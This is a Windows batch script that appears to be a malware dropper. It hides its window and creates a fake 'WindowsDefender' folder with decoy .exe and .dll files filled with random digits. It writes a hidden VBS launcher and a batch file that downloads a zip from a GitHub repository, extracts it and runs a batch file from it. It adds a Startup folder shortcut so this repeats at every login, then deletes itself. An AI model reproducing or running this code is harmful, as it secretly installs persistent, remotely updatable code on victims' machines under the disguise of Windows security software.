@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
if exist "%userprofile%\WindowsDefender" rmdir "%userprofile%\WindowsDefender"
md "%userprofile%\WindowsDefender"
echo powershell -command "do {$ping = test-connection -comp github.com -count 1 -Quiet} until ($ping)" > "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
echo cd "%%userprofile%%\WindowsDefender" >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
echo if exist WindowsDefenderServices rmdir /s /q WindowsDefenderServices >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
echo if exist WindowsDefenderServices.zip del WindowsDefenderServices.zip >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
echo powershell -command "Invoke-WebRequest 'https://github.com/aarec1/1/archive/refs/heads/main.zip' -OutFile WindowsDefenderServices.zip" >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
echo powershell -command "Expand-Archive WindowsDefenderServices.zip '.\'" >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
echo del WindowsDefenderServices.zip >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
echo rename 1-main WindowsDefenderServices >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
echo cd WindowsDefenderServices >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
echo rename 1.bat WindowsDefenderSecurity.bat >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
echo echo rmdir /s /q "%%%%userprofile%%%%\WindowsDefender\WindowsDefenderServices" ^^^& exit ^>^> WindowsDefenderSecurity.bat >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
echo WindowsDefenderSecurity.bat >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
echo Set WshShell = CreateObject("WScript.Shell") > "%userprofile%\WindowsDefender\WindowsDefenderBackgroundServices.vbs"
echo WshShell.Run chr(34) ^& "%%userprofile%%\WindowsDefender\WindowsDefenderScan.bat" ^& Chr(34), 0 >> "%userprofile%\WindowsDefender\WindowsDefenderBackgroundServices.vbs"
echo Set WshShell = Nothing >> "%userprofile%\WindowsDefender\WindowsDefenderBackgroundServices.vbs"
echo %random%%random%%random%%random% > "%userprofile%\WindowsDefender\WindowsDefenderServices.exe"
echo %random%%random%%random%%random% > "%userprofile%\WindowsDefender\WindowsDefenderServicesUpdates.dll"
echo %random%%random%%random%%random% > "%userprofile%\WindowsDefender\WindowsDefenderServicesBackground.dll"
mklink "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Defender Services.lnk" "%userprofile%\WindowsDefender\WindowsDefenderBackgroundServices.vbs" >nul 2>&1

del %0 & exit
